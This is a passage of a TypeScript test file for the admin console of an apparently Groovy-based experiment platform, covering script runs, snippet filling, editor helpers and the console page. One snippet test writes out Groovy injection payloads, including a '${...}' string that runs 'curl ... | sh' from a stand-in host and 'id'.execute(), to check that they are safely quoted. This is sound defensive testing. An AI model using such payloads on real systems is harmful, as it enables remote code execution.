    await nextTick()
    expect(run.status).toBe('pending')
    push('error', refusal, 'SendScript', id)
    await nextTick()
    await flushPromises()
    expect(run).toMatchObject({ status: 'error', error: refusal })
    // read as a plain sentence: no exception name, no line to point at
    const e = parseGroovyError(refusal)
    expect(e).toMatchObject({ title: refusal, hint: null, places: [] })
  })

  it('runs a script and records the engine\'s answer and the history', async () => {
    seedConsole('run@x.org', '')
    const run = runConsoleScript('g.V.count()', { label: 'Script', fromLine: 1 })!
    expect(actions.runScript).toHaveBeenCalledWith('g.V.count()')
    expect(run.status).toBe('pending')
    push('error', 'Caught error: ScriptException: groovy.lang.MissingPropertyException: No such property: g for class: Script3\n  at Script3.groovy:1')
    await nextTick()
    await flushPromises()
    expect(run.status).toBe('error')
    expect(run.error).toMatch(/No such property/)
    expect(consoleState.history[0]).toMatchObject({ script: 'g.V.count()', ok: false })
  })

  it('adds no run and no history when the connection is down', () => {
    seedConsole('offline@x.org', '')
    actions.runScript.mockReturnValueOnce(null)
    expect(runConsoleScript('g.V.count()', { label: 'Script', fromLine: 1 })).toBeNull()
    expect(consoleState.runs).toHaveLength(0)
    expect(consoleState.history).toHaveLength(0)
  })
})

describe('snippets', () => {
  it('only offers commands from the known groups, with code', () => {
    for (const s of SNIPPETS) {
      expect(SNIPPET_GROUPS).toContain(s.group)
      expect(s.code.trim()).not.toBe('')
      expect(s.text.trim()).not.toBe('')
    }
    expect(new Set(SNIPPETS.map(s => s.id)).size).toBe(SNIPPETS.length)
  })

  it('fills in real player ids, people first', () => {
    expect(pickIds(['_1', '3', '8'])).toEqual(['3', '8'])
    expect(pickIds(['_1'])).toEqual(['_1', '2'])
    expect(pickIds([])).toEqual(['1', '2'])
    expect(fillSnippet('edgeEdits.adminEdit("add", {p1}, {p2})', ['3', 'a"b'])).toBe('edgeEdits.adminEdit("add", \'3\', \'a"b\')')
  })

  // Splits Groovy source into the text outside single-quoted strings and the decoded strings.
  function lexSingleQuoted (src: string) {
    let outside = ''
    const literals: string[] = []
    const escapes: Record<string, string> = { n: '\n', r: '\r', '\\': '\\', "'": "'" }
    for (let i = 0; i < src.length; i++) {
      if (src[i] !== "'") { outside += src[i]; continue }
      let lit = ''
      for (i++; i < src.length && src[i] !== "'"; i++) {
        if (src[i] === '\n' || src[i] === '\r') throw new Error('raw line break inside a string')
        if (src[i] === '\\') { i++; lit += escapes[src[i]] ?? (() => { throw new Error('unknown escape \\' + src[i]) })() } else lit += src[i]
      }
      if (i >= src.length) throw new Error('unterminated string')
      literals.push(lit)
    }
    return { outside, literals }
  }

  it('puts participant-chosen ids in single-quoted strings, so ${…} never runs', () => {
    const evil = `\${'curl -s http://x/y.sh|sh'.execute()}'"\\\n\r{p2}$x`
    const other = `'+\${'id'.execute()}+'`
    for (const s of SNIPPETS.filter(s => s.code.includes('{p1}'))) {
      expect(s.code).not.toMatch(/"\{p[12]\}"/)
      const out = fillSnippet(s.code, [evil, other])
      const { outside, literals } = lexSingleQuoted(out)
      expect(outside).not.toContain('${')
      expect(outside).not.toContain('execute')
      expect(literals).toContain(evil)
      if (s.code.includes('{p2}')) expect(literals).toContain(other)
    }
    expect(fillSnippet('g.getVertex({p1}).map()', [`\${'x'.execute()}`, '2'])).toBe(`g.getVertex('\${\\'x\\'.execute()}').map()`)
  })

  it('searches titles, explanations and code', () => {
    expect(searchSnippets(SNIPPETS, 'adminEdit').map(s => s.id)).toEqual(['tie-add', 'tie-remove'])
    expect(searchSnippets(SNIPPETS, '').length).toBe(SNIPPETS.length)
  })
})

describe('editor helpers', () => {
  function view (doc: string, anchor: number, head = anchor) {
    const v = new EditorView({ state: EditorState.create({ doc, selection: { anchor, head } }), parent: document.body })
    return v
  }

  it('reports the selected lines', () => {
    const v = view('a\nb\nc\nd', 2, 6)
    expect(selectionOf(v)).toEqual({ text: 'b\nc\n', fromLine: 2, toLine: 3, empty: false })
    v.destroy()
  })

  it('inserts a command on its own line and selects it', () => {
    const v = view('g.V.count()', 3)
    insertBlock(v, 'g.E.count()')
    expect(v.state.doc.toString()).toBe('g.V.count()\ng.E.count()')
    expect(selectionOf(v).text).toBe('g.E.count()')
    v.destroy()
  })

  it('never replaces a selection: the command goes on the line after it', () => {
    const v = view('a()\nb()', 0, 3)
    insertBlock(v, 'x()')
    expect(v.state.doc.toString()).toBe('a()\nx()\nb()')
    expect(selectionOf(v)).toMatchObject({ text: 'x()', fromLine: 2 })
    v.destroy()
  })

  it('uses an empty line as it is', () => {
    const v = view('a\n\nb', 2)
    insertBlock(v, 'x()')
    expect(v.state.doc.toString()).toBe('a\nx()\nb')
    goToLine(v, 3)
    expect(selectionOf(v)).toMatchObject({ fromLine: 3, text: 'b' })
    v.destroy()
  })
})

describe('ConsolePage', () => {
  const CodeStub = defineComponent({
    name: 'BCodeEditor',
    props: ['modelValue', 'onRun', 'onSave', 'language', 'fill', 'ariaLabel', 'placeholder', 'readonly'],
    emits: ['update:modelValue'],
    setup (props, { emit, expose }) {
      expose({ focus: () => {}, selection: () => '', insert: () => {} })
      return () => h('textarea', { class: 'code-stub', value: props.modelValue, onInput: (e: any) => emit('update:modelValue', e.target.value) })
    },
  })

  it('keeps its own buffer when the server pushes a different currentScript, and runs it', async () => {
    // the page seeds for the signed-in account (admin.email)
    seedConsole('r@lab.org', 'server()')
    consoleState.buffer = 'g.V.count()'
    const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
    admin.user = { ...admin.user, currentScript: 'something else' }
    await nextTick()
    expect((w.find('textarea.code-stub').element as HTMLTextAreaElement).value).toBe('g.V.count()')

    const run = w.findAll('button').find(b => b.text() === 'Run script')!
    await run.trigger('click')
    expect(actions.runScript).toHaveBeenCalledWith('g.V.count()')
    push('output', 'g.V.count()\n\n==>3')
    await nextTick()
    await flushPromises()
    expect(w.text()).toContain('Results')
    expect(w.find('.run.is-ok').exists()).toBe(true)
    expect(w.find('.run__value').text()).toBe('3')
    w.unmount()
  })

  it('opens a step\'s line its error names on the Steps page, and the script\'s own line in the editor', async () => {
    seedConsole('r@lab.org', '')
    consoleState.buffer = 'roundStep.start()'
    consoleState.runs = []
    admin.user = { ...admin.user, engine: { experimentId: 4, experimentName: 'Trust game' } }
    const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
    try {
      await w.findAll('button').find(b => b.text() === 'Run script')!.trigger('click')
      const id = actions.runScript.mock.results[0].value
      // RoundStep (Script534) failed at its line 71, started by the script typed here (Script950, line 1)
      push('error', 'Caught error: MissingPropertyException: No such property: x for class: Script534\n  at Script534.groovy:71\n' +
        '  at step.groovy:64\n  at Script950.groovy:1\n', 'SendScript', id, {
        step: 'RoundStep',
        frames: [{ file: 'Script534.groovy', line: 71, step: 'RoundStep', own: true }, { file: 'Script950.groovy', line: 1 }],
      })
      await nextTick()
      await flushPromises()
      expect(w.findAll('.run .eng-err__places li').map(li => li.text())).toEqual(['Line 1 of your script', 'RoundStep line 71'])
      routerPush.mockClear()
      await w.findAll('.run button.eng-err__place')[1].trigger('click')
      expect(routerPush).toHaveBeenCalledWith({ path: '/steps', query: { step: 'RoundStep', line: '71', experiment: '4' } })
      await w.findAll('.run button.eng-err__place')[0].trigger('click')
      expect(routerPush).toHaveBeenCalledTimes(1)
    } finally {
      admin.user = { ...admin.user, engine: undefined }
      w.unmount()
    }
  })

  it('does not run an empty editor', async () => {
    seedConsole('r@lab.org', '')
    consoleState.buffer = '   '
    const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
    const run = w.findAll('button').find(b => b.text() === 'Run script')!
    expect(run.attributes('disabled')).toBeDefined()
    w.unmount()
  })

  it('says at once that a script could not run while the connection is down', async () => {
    seedConsole('r@lab.org', '')
    consoleState.buffer = 'g.V.count()'
    consoleState.runs = []
    const conn = (store as any).connectionState
    conn.value = 'reconnecting'
    const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
    await nextTick()
    expect(w.find('.con__notice').text()).toContain('scripts can\'t run right now')
    actions.runScript.mockReturnValueOnce(null)
    await w.findAll('button').find(b => b.text() === 'Run script')!.trigger('click')
    expect((store as any).ensureConnected).toHaveBeenCalled()
    expect(consoleState.runs).toHaveLength(0)
    expect(w.find('.run.is-pending').exists()).toBe(false)
    conn.value = 'open'
    w.unmount()
  })

  it('says scripts can’t run here while the engine runs another experiment', async () => {
    seedConsole('r@lab.org', '')
    consoleState.buffer = 'g.V.count()'
    const elsewhere = (store as any).engineElsewhere
    elsewhere.value = { experimentId: 2, experimentName: 'Live study', sessionId: 9, sessionName: 'Wave 2', owner: 'boss@lab.org' }
    try {
      const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
      await nextTick()
      expect(w.find('.con__ctx-text').text()).toBe('The engine is running “Live study”, not this one: scripts can’t run here now')
      w.unmount()
    } finally {
      elsewhere.value = null
    }
  })
})
